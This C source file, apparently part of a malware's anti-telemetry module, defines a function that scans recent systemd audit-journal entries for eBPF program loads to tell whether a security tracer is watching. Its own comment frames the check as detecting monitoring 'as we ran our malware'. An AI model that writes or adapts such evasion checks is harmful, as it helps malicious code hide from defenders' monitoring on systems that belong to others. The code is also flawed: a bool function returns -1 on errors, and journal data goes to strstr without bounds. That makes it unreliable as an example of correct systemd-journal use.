#include "anti_telemetry.h"

#ifdef __UNIX__
#include <systemd/sd-journal.h>

bool CheckEBPFTracer(void)
{
    /* open new journal object */
    sd_journal *j;
    if (sd_journal_open(&j, SD_JOURNAL_SYSTEM) < 0)
        return -1;

    /* get file descriptor and prepare for consumption */
    if (sd_journal_get_fd(j) < 0)
        return -1;

    /* seek to tail of event logs */
    if (sd_journal_seek_tail(j) < 0)
        return -1;

    /* add filter on only audit events */
    sd_journal_add_match(j, "_TRANSPORT=audit", 0);
    sd_journal_add_conjunction(j);

    /* call first to be able to get individual events */
    if (sd_journal_previous(j) < 0)
        return -1;

    /* we'll only traverse back to these number of entries. If there is a BPF program load in this
     * set, we can assume that a security tracer became active as we ran our malware */
    int count = 5;

    /* flags gets set if a BPF program load is detected in the previous `count` entries */
    int bpf_load = 0;
    int bpf_unload = 0;

    /* TODO: for more granularity, we can also check and store the BPF program ID */

    /* use convenient macro to iterate through most recent entries */
    SD_JOURNAL_FOREACH_BACKWARDS(j) {

        if (count == 0)
            break;

        const char *data;
        size_t len;

        /* get message and parse if BPF call is involved */
        sd_journal_get_data(j, "MESSAGE", (const void **)&data, &len);
        if (strstr(data, "MESSAGE=BPF") != NULL) {

            /* check if the program was loaded or unloaded */
            if (strstr(data, "op=LOAD") != NULL)
                bpf_load = 1;
            else if (strstr(data, "op=UNLOAD") != NULL)
                bpf_unload = 1;
        }
        count--;
    }

    /* cleanup */
    sd_journal_close(j);

    /* if the previous entries contained a full load cycle, we can assume that the program was
     * detached and not monitoring us. However, if there is a load and no unload, we can assume it's
     * still watching us.
     */
    if (bpf_load && !bpf_unload) {
        return true;
    }
    return false;
}
#endif
